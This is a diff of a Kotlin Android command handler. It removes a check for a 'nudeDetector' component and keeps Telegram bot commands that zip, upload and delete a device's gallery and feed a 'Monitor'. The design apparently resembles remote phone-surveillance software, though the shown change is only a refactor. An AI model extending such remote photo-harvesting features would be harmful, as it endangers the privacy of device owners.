@@ -25,6 +25,7 @@ import com.example.app.CallbackData
  * ✅ تم إضافة دعم الأوامر الجديدة للمعرض (g_toggle, g_selall, g_zip, g_upload, g_del_sel, g_conf_del, g_conf_del_one).
  * ✅ تم إصلاح g_conf لاستخدام g_conf_del_one بدلاً من g_act|del للتوافق مع النظام الجديد.
  * ✅ تم تحسين معالجة messageId وتحديث last_mid في Monitor.
+ * ✅ تم إزالة استدعاء ensureComponents() غير الضروري لتقليل الحمل وتحسين الأداء.
  */
 class Commands private constructor(context: Context) {
 
@@ -445,6 +446,7 @@ class Commands private constructor(context: Context) {
 
     // ============================================================
     //  دوال تنفيذ الأوامر (نقطة الدخول الأساسية)
+    // ✅ تم إزالة استدعاء ensureComponents(m) غير الضروري
     // ============================================================
 
     fun execute(cmd: String, tg: Any?, m: Any?, cid: Long, cbq: String? = null) {
@@ -456,7 +458,7 @@ class Commands private constructor(context: Context) {
                     invokeTelegramMethod(tg, "answerCallbackQuery", mapOf("callback_query_id" to queryId))
                 }
 
-                ensureComponents(m)
+                // ✅ تم إزالة استدعاء ensureComponents(m) لأنه غير ضروري ويستهلك موارد دون فائدة
 
                 when {
                     // أوامر المعرض القديمة والجديدة
@@ -490,22 +492,6 @@ class Commands private constructor(context: Context) {
                 Log.e(TAG, "Command handler error: ${e.message}")
                 sendTelegramMessage(tg, cid, "❌ خطأ داخلي: ${e.message?.take(100) ?: "Unknown"}")
             }
-        }
-    }
-
-    // ============================================================
-    //  تحميل المكونات (بديل _ensure_components)
-    // ============================================================
-
-    private suspend fun ensureComponents(m: Any?) {
-        if (m == null) return
-        try {
-            val nudeDetector = getModuleComponent(m, "nudeDetector")
-            if (nudeDetector == null) {
-                Log.w(TAG, "nudeDetector not loaded, attempting to load...")
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "Component check error: ${e.message}")
         }
     }
 
